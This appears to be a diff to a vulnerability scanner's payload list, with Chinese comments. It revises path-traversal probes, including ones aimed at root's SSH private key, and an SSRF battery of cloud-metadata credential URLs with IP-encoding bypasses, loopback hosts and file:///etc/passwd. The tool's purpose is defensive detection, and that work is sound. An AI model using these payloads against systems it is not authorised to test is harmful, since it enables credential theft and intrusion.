@@ -103,13 +103,14 @@ _PT_KEY = [
     "../../../../../../root/.ssh/id_rsa",
     "../../../../.ssh/id_rsa",
 ]
-# 围栏差分（治“写型路径穿越”无内容回显 + “读固定文件/非 passwd”的越界判定）：
-# 越界路径（遍历 + 绝对），{TOKEN} 作唯一 canary 名（便于识别回显/写落点）。
-# 判定在 executor._path_confinement_ev：越界路径未被“围栏拒绝”→ 疑似未做路径限制。
+# 写型路径穿越（无内容回显）：越界路径（遍历 + 绝对），{TOKEN} 作唯一 canary 名。
+# {TOKEN} 本身已带 "mcpf" 前缀，故路径不再自己加（原 "/tmp/mcpf{TOKEN}" 会叠成 mcpfmcpf）。
+# 判定在 executor：fail-closed——写后用读回器读该唯一落地路径，读到内容=真落到越界处=confirmed；
+# 读不到（被围栏拦/无读回器）→ 不产结论。不再解析服务端“拒绝措辞”。
 _PT_CONFINE = [
-    "/tmp/mcpf{TOKEN}",
-    "../../../../../../tmp/mcpf{TOKEN}",
-    "../../../../../../tmp/mcpf{TOKEN}.txt",
+    "/tmp/{TOKEN}",
+    "../../../../../../tmp/{TOKEN}",
+    "/tmp/{TOKEN}.txt",
 ]
 
 
@@ -156,26 +157,41 @@ def _ssrf_battery() -> list[dict]:
         ("?url={CALLBACK}", "ssrf:oob-urlparam"),                    # 值被塞进既有 query 串
         ("?target={CALLBACK}", "ssrf:oob-targetparam"),
     ]
-    out = [{"value": v, "channel": "oob", "expect": None, "control": None,
+    # 公网回连（打我们的 collector）：只证明"服务端能对外发请求"=可达性，**不**构成 SSRF——
+    # 对 URL 抓取类工具这本就是本职功能。target_scope="public" → executor 不据此产漏洞结论。
+    out = [{"value": v, "channel": "oob", "expect": None, "control": None, "target_scope": "public",
             "delay_target": 0.0, "technique": t} for v, t in oob_forms]
-    # 2) 信任边界：云元数据端点（AWS/阿里云/Azure/GCP，含 IP 变形绕过）。命中元数据体签名=confirmed。
+    # 2) 信任边界：云元数据端点（AWS/阿里云/腾讯云/Azure/GCP，含 IP 变形绕过）。
+    #    target_scope="internal"：这些目标**只有越过信任边界才够得到**。命中元数据体签名=confirmed；
+    #    即便未回显体、只要 is_error==False（服务端成功取回了内网资源）→ 疑似（见 executor）。
     for url in ("http://169.254.169.254/latest/meta-data/",
                 "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
                 "http://2852039166/latest/meta-data/",       # 169.254.169.254 十进制
                 "http://0xA9FEA9FE/latest/meta-data/",        # 十六进制
                 "http://[::ffff:169.254.169.254]/latest/meta-data/",  # IPv6 映射
                 "http://100.100.100.200/latest/meta-data/",   # 阿里云
+                "http://metadata.tencentyun.com/latest/meta-data/",   # 腾讯云
                 "http://169.254.169.254/metadata/instance?api-version=2021-02-01",  # Azure IMDS
                 "http://metadata.google.internal/computeMetadata/v1/"):            # GCP
         out.append({"value": url, "channel": "inband", "expect": list(_SSRF_META_SIGS),
-                    "control": None, "delay_target": 0.0, "technique": f"ssrf:meta:{url[:26]}"})
-    # 3) 元数据端点的 host-only 形态（sink 只接受 host、自行补 scheme/path 时）
-    for host in ("169.254.169.254", "metadata.google.internal"):
+                    "control": None, "target_scope": "internal",
+                    "delay_target": 0.0, "technique": f"ssrf:meta:{url[:26]}"})
+    # 3) 环回/内网主机：服务端若能取回这些（is_error==False）即已越过信任边界 → 疑似 SSRF。
+    #    不含元数据体签名，靠“成功取回内网资源”判定（fail-closed：仅成功计，拒绝/报错不计）。
+    for url in ("http://127.0.0.1/", "http://127.0.0.1:3000/", "http://localhost/",
+                "http://169.254.0.23/", "http://[::1]/"):
+        out.append({"value": url, "channel": "inband", "expect": None,
+                    "control": None, "target_scope": "internal",
+                    "delay_target": 0.0, "technique": f"ssrf:loopback:{url[:24]}"})
+    # 4) 元数据端点的 host-only 形态（sink 只接受 host、自行补 scheme/path 时）
+    for host in ("169.254.169.254", "metadata.google.internal", "metadata.tencentyun.com"):
         out.append({"value": host, "channel": "inband", "expect": list(_SSRF_META_SIGS),
-                    "control": None, "delay_target": 0.0, "technique": f"ssrf:meta-host:{host[:18]}"})
-    # 4) file:// 协议读本地文件（抓取器若支持 file scheme → 返回 /etc/passwd）
+                    "control": None, "target_scope": "internal",
+                    "delay_target": 0.0, "technique": f"ssrf:meta-host:{host[:18]}"})
+    # 5) file:// 协议读本地文件（抓取器若支持 file scheme → 返回 /etc/passwd），内网读 → internal
     out.append({"value": "file:///etc/passwd", "channel": "inband", "expect": list(_PT_PASSWD_SIGS),
-                "control": None, "delay_target": 0.0, "technique": "ssrf:file"})
+                "control": None, "target_scope": "internal",
+                "delay_target": 0.0, "technique": "ssrf:file"})
     return out
 
 
